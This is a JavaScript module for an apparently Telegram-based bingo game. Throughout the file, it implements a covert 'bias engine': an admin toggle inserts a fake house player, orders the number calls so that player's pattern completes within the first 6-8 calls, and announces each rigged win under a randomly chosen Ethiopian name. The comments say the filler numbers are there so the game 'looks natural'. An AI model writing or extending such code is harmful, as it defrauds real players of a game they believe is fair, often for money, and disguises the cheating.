// biasEngine.js — Biased bingo system: sequence-based bias
// When toggle is ON, the call sequence is reordered so the admin's
// pattern numbers are called within the first 6-8 numbers.
const cache = require("./cache");
const { getCard } = require("./utils");
const { PrismaClient } = require("@prisma/client");

const prisma = new PrismaClient();

// Reserved Telegram ID for the bias fake player
const BIAS_PLAYER_TID = BigInt("9999999999");

// ─── 100 Ethiopian Names ───────────────────────────────────────────
const FAKE_NAMES = [
  "Abebe",
  "Kebede",
  "Tesfaye",
  "Bekele",
  "Getachew",
  "Haile",
  "Alemayehu",
  "Tadesse",
  "Girma",
  "Desta",
  "Mekonnen",
  "Yohannes",
  "Solomon",
  "Dawit",
  "Daniel",
  "Samuel",
  "Henok",
  "Natnael",
  "Elias",
  "Bereket",
  "Yonas",
  "Nahom",
  "Robel",
  "Fitsum",
  "Mulatu",
  "Fikadu",
  "Abiy",
  "Jemal",
  "Seid",
  "Mohammed",
  "Hussein",
  "Ahmed",
  "Ismail",
  "Mustafa",
  "Abdulrahman",
  "Kassahun",
  "Worku",
  "Assefa",
  "Endale",
  "Zewdu",
  "Ayele",
  "Tesema",
  "Fenta",
  "Dejene",
  "Habte",
  "Nigatu",
  "Tilahun",
  "Binyam",
  "Sileshi",
  "Tewodros",
  "Belay",
  "Chala",
  "Gemechu",
  "Lelisa",
  "Diriba",
  "Kumsa",
  "Tolosa",
  "Fufa",
  "Jiregna",
  "Tola",
  "Lema",
  "Daba",
  "Jaleta",
  "Boru",
  "Bedilu",
  "Fekadu",
  "Kiros",
  "Tekle",
  "Girmay",
  "Berhane",
  "Hailemariam",
  "Kidane",
  "Tesfalem",
  "Yemane",
  "Zeray",
  "Abraha",
  "Kahsay",
  "Gebremedhin",
  "Hagos",
  "Mehari",
  "Negasi",
  "Tesfom",
  "Weldemichael",
  "Berihu",
  "Yared",
  "Misganaw",
  "Addisu",
  "Ermias",
  "Ephrem",
  "Surafel",
  "Melaku",
  "Tamirat",
  "Moges",
  "Wondimu",
  "Aschalew",
  "Baye",
  "Demeke",
  "Endrias",
  "Getnet",
  "Tsegaye",
];

// ─── All Bingo Patterns ───────────────────────────────────────────
const ALL_PATTERNS = [
  {
    name: "Row 0 (Top)",
    positions: [
      [0, 0],
      [0, 1],
      [0, 2],
      [0, 3],
      [0, 4],
    ],
  },


  {
    name: "Four Corners",
    positions: [
      [0, 0],
      [0, 4],
      [4, 0],
      [4, 4],
    ],
  },
  {
    name: "Row 4 (Bottom)",
    positions: [
      [4, 0],
      [4, 1],
      [4, 2],
      [4, 3],
      [4, 4],
    ],
  },

  {
    name: "Row 1",
    positions: [
      [1, 0],
      [1, 1],
      [1, 2],
      [1, 3],
      [1, 4],
    ],
  },


  {
    name: "Anti Diagonal",
    positions: [
      [0, 4],
      [1, 3],
      [2, 2],
      [3, 1],
      [4, 0],
    ],
  },


  {
    name: "Row 3",
    positions: [
      [3, 0],
      [3, 1],
      [3, 2],
      [3, 3],
      [3, 4],
    ],
  },


  {
    name: "Main Diagonal",
    positions: [
      [0, 0],
      [1, 1],
      [2, 2],
      [3, 3],
      [4, 4],
    ],
  },
  {
    name: "Row 2 (Middle)",
    positions: [
      [2, 0],
      [2, 1],
      [2, 2],
      [2, 3],
      [2, 4],
    ],
  },


];

// ─── Redis Keys ────────────────────────────────────────────────────
const K = {
  toggle: "bias_toggle",
  patternIndex: "bias_pattern_index",
  recentWinners: "bias_recent_winners",
  adminWins: "bias_admin_wins",
  totalRounds: "bias_total_rounds",
  gameCard: (id) => `bias_card_${id}`,
  gameFakeName: (id) => `bias_fake_name_${id}`,
  gamePatternName: (id) => `bias_pattern_name_${id}`,
};

// ─── Toggle ────────────────────────────────────────────────────────
async function getToggle() {
  const v = await cache.get(K.toggle);
  return v === true || v === 1 || v === "true" || v === "1";
}

async function setToggle(on) {
  await cache.set(K.toggle, on ? 1 : 0);
  return on;
}

// ─── Pattern Cycle ─────────────────────────────────────────────────
async function getCurrentPatternIndex() {
  const v = await cache.get(K.patternIndex);
  return typeof v === "number" ? v : 0;
}

async function getCurrentPattern() {
  const idx = await getCurrentPatternIndex();
  return { index: idx, pattern: ALL_PATTERNS[idx % ALL_PATTERNS.length] };
}

async function advancePatternIndex() {
  const idx = await getCurrentPatternIndex();
  const next = (idx + 1) % ALL_PATTERNS.length;
  await cache.set(K.patternIndex, next);
  return next;
}

// ─── Fake Name Selection ───────────────────────────────────────────
async function pickFakeName() {
  let recent = (await cache.get(K.recentWinners)) || [];
  if (!Array.isArray(recent)) recent = [];

  const recentSet = new Set(recent);
  const available = FAKE_NAMES.filter((n) => !recentSet.has(n));
  const pool = available.length > 0 ? available : FAKE_NAMES;

  const name = pool[Math.floor(Math.random() * pool.length)];

  recent.push(name);
  if (recent.length > 10) recent = recent.slice(-10);
  await cache.set(K.recentWinners, recent);

  return name;
}

// ─── Extract Numbers From Card at Pattern Positions ────────────────
function getRequiredNumbers(card, pattern) {
  const numbers = [];
  for (const [r, c] of pattern.positions) {
    const val = card[r][c];
    if (val === "FREE") continue;
    numbers.push(val);
  }
  return numbers;
}

// ─── Shuffle helper ────────────────────────────────────────────────
function shuffleArray(arr) {
  const a = arr.slice();
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

// ─── Build Biased Sequence ─────────────────────────────────────────
// Places admin's winning numbers within the first 6-8 calls,
// mixed with random filler numbers so it looks natural.
function buildBiasedSequence(adminNumbers) {
  const adminSet = new Set(adminNumbers);
  const allNums = [];
  for (let i = 1; i <= 75; i++) allNums.push(i);

  // Separate admin numbers from the rest
  const rest = allNums.filter((n) => !adminSet.has(n));
  const shuffledRest = shuffleArray(rest);
  const shuffledAdmin = shuffleArray(adminNumbers);

  // Target: admin wins within 6-8 calls
  // We have N admin numbers (typically 4-5). Fill slots to reach 6-8 total.
  const adminCount = shuffledAdmin.length;
  const totalEarlyCalls = Math.max(adminCount, Math.min(8, adminCount + 3));
  const fillerCount = totalEarlyCalls - adminCount;

  // Take filler numbers from the rest
  const fillers = shuffledRest.splice(0, fillerCount);

  // Mix admin numbers and fillers in the early positions
  const earlySlots = shuffleArray([...shuffledAdmin, ...fillers]);

  // Build full sequence: early (biased) + remaining
  return [...earlySlots, ...shuffledRest];
}

// ─── Ensure Bias Player Exists ─────────────────────────────────────
async function ensureBiasPlayer() {
  let player = await prisma.player.findUnique({
    where: { telegramId: BIAS_PLAYER_TID },
  });
  if (!player) {
    player = await prisma.player.create({
      data: {
        telegramId: BIAS_PLAYER_TID,
        username: "BiasBot",
        wallet: 999999,
        gift: 0,
      },
    });
  }
  return player;
}

// ─── Ensure Bias Selection (Pre-Game) ──────────────────────────────
// Called on EVERY gameState poll when toggle is ON and game hasn't started.
// Creates a Selection for the bias player (like a real player picking a card),
// and maintains a heartbeat so the stale cleanup doesn't remove it.
async function ensureBiasSelection(gameId, takenIndices = []) {
  const toggleOn = await getToggle();
  if (!toggleOn) return null;

  const biasPlayer = await ensureBiasPlayer();

  // Keep heartbeat alive
  await cache.set(`hb_${gameId}_${BIAS_PLAYER_TID}`, Date.now(), 30);
  await cache.set(`seen_${BIAS_PLAYER_TID}`, Date.now(), 120);

  // Check if selection already exists
  const existing = await prisma.selection.findFirst({
    where: { gameId, playerId: biasPlayer.id, accepted: true },
  });
  if (existing) return existing;

  // Pick a random card not already taken
  const takenSet = new Set(takenIndices);
  let cardIndex;
  let attempts = 0;
  do {
    cardIndex = Math.floor(Math.random() * 200) + 1;
    attempts++;
  } while (takenSet.has(cardIndex) && attempts < 300);

  try {
    const sel = await prisma.selection.create({
      data: {
        gameId,
        playerId: biasPlayer.id,
        slot: 0,
        index: cardIndex,
        accepted: true,
        autoEnabled: false, // bias engine handles win, not normal auto-claim
      },
    });
    return sel;
  } catch (err) {
    console.error("biasEngine: failed to create bias selection:", err);
    return null;
  }
}

// ─── Remove Bias Selection ─────────────────────────────────────────
async function removeBiasSelection(gameId) {
  try {
    const biasPlayer = await prisma.player.findUnique({
      where: { telegramId: BIAS_PLAYER_TID },
    });
    if (biasPlayer) {
      await prisma.selection.deleteMany({
        where: { gameId, playerId: biasPlayer.id },
      });
    }
  } catch (_) { }
}

// ─── Init Bias Round ───────────────────────────────────────────────
// Called at game start when toggle is ON.
// Returns { biasedSequence, fakeName, cardIndex, patternName }
// The biasedSequence has admin's winning numbers in the first 6-8 calls.
async function initBiasRound(gameId, takenIndices = []) {
  const toggleOn = await getToggle();
  if (!toggleOn) return null;

  const fakeName = await pickFakeName();
  const { pattern } = await getCurrentPattern();

  // Find existing bias selection
  const biasPlayer = await ensureBiasPlayer();
  let biasSel = await prisma.selection.findFirst({
    where: { gameId, playerId: biasPlayer.id, accepted: true },
  });

  if (!biasSel) {
    biasSel = await ensureBiasSelection(gameId, takenIndices);
  }

  if (!biasSel) return null;

  const cardIndex = biasSel.index;
  const card = getCard(cardIndex);
  const requiredNumbers = getRequiredNumbers(card, pattern);

  // Build biased sequence — admin numbers called within first 6-8
  const biasedSequence = buildBiasedSequence(requiredNumbers);

  // Save info in Redis for winner detection in callTicker
  const ttl = 1800;
  await cache.set(K.gameCard(gameId), cardIndex, ttl);
  await cache.set(K.gameFakeName(gameId), fakeName, ttl);
  await cache.set(K.gamePatternName(gameId), pattern.name, ttl);

  return {
    biasedSequence,
    fakeName,
    cardIndex,
    patternName: pattern.name,
    requiredNumbers,
  };
}

// ─── Check Admin Win ───────────────────────────────────────────────
// Called by callTicker after each number. Checks if the admin's pattern
// is now complete given the called numbers.
// Returns { adminWon, fakeName, patternName, cardIndex } or null
async function checkAdminWin(gameId, calledSet) {
  const toggleOn = await getToggle();
  if (!toggleOn) return null;

  const cardIndex = await cache.get(K.gameCard(gameId));
  if (cardIndex == null) return null;

  const { pattern } = await getCurrentPattern();
  const card = getCard(cardIndex);
  const requiredNumbers = getRequiredNumbers(card, pattern);

  // Check if all required numbers have been called
  const allCalled = requiredNumbers.every((n) => calledSet.has(n));
  if (!allCalled) return null;

  // Admin won!
  const fakeName = await cache.get(K.gameFakeName(gameId));
  const patternName = await cache.get(K.gamePatternName(gameId));

  // Increment stats
  const wins = ((await cache.get(K.adminWins)) || 0) + 1;
  const rounds = ((await cache.get(K.totalRounds)) || 0) + 1;
  await cache.set(K.adminWins, wins);
  await cache.set(K.totalRounds, rounds);

  // Advance pattern cycle
  await advancePatternIndex();

  return {
    adminWon: true,
    fakeName: fakeName || "Unknown",
    patternName: patternName || "Unknown",
    cardIndex,
  };
}

// ─── Advance Round (even when toggle OFF) ──────────────────────────
async function advanceRoundStats() {
  const rounds = ((await cache.get(K.totalRounds)) || 0) + 1;
  await cache.set(K.totalRounds, rounds);
  await advancePatternIndex();
}

// ─── Status for Sidebar ────────────────────────────────────────────
async function getBiasStatus() {
  const toggleOn = await getToggle();
  const wins = (await cache.get(K.adminWins)) || 0;
  const rounds = (await cache.get(K.totalRounds)) || 0;
  const { index, pattern } = await getCurrentPattern();
  const recent = (await cache.get(K.recentWinners)) || [];

  return {
    enabled: toggleOn,
    adminWins: wins,
    totalRounds: rounds,
    currentPatternIndex: index,
    currentPatternName: pattern.name,
    recentWinners: Array.isArray(recent) ? recent : [],
    allPatterns: ALL_PATTERNS.map((p, i) => ({ index: i, name: p.name })),
  };
}

// ─── Reset Stats ───────────────────────────────────────────────────
async function resetBiasStats() {
  await cache.set(K.adminWins, 0);
  await cache.set(K.totalRounds, 0);
  await cache.set(K.patternIndex, 0);
  await cache.set(K.recentWinners, []);
}

// ─── Cleanup game keys ────────────────────────────────────────────
async function cleanupGame(gameId) {
  await cache.del(K.gameCard(gameId));
  await cache.del(K.gameFakeName(gameId));
  await cache.del(K.gamePatternName(gameId));
}

module.exports = {
  FAKE_NAMES,
  ALL_PATTERNS,
  BIAS_PLAYER_TID,
  getToggle,
  setToggle,
  getCurrentPattern,
  getCurrentPatternIndex,
  advancePatternIndex,
  pickFakeName,
  getRequiredNumbers,
  buildBiasedSequence,
  ensureBiasPlayer,
  ensureBiasSelection,
  removeBiasSelection,
  initBiasRound,
  checkAdminWin,
  advanceRoundStats,
  getBiasStatus,
  resetBiasStats,
  cleanupGame,
};
